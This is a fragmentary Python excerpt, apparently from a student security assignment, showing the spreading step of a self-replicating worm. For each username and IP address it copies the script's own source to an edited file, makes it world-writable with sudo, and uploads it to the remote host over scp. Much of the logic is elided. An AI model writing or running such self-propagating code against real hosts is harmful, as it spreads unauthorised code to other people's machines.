        ...
        for user in usernames:
            ...
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                ...
                try:
                    ...
                    # temp_file = open("edited_1805116_2.py", "w")
                    with open(sys.argv[0], "r") as current_file:
                        all_lines = current_file.readlines()
                        with open("edited_1805116_2.py", "w") as temp_file:
                            ...
                            temp_file.flush()
                    # temp_file.close()
                    os.system("sudo chmod 777 edited_1805116_2.py")
                    scpcon.put("edited_1805116_2.py", "1805116_2.py") 
                    # temp_file.close()             
                    scpcon.close()
                    # temp_file.close() 
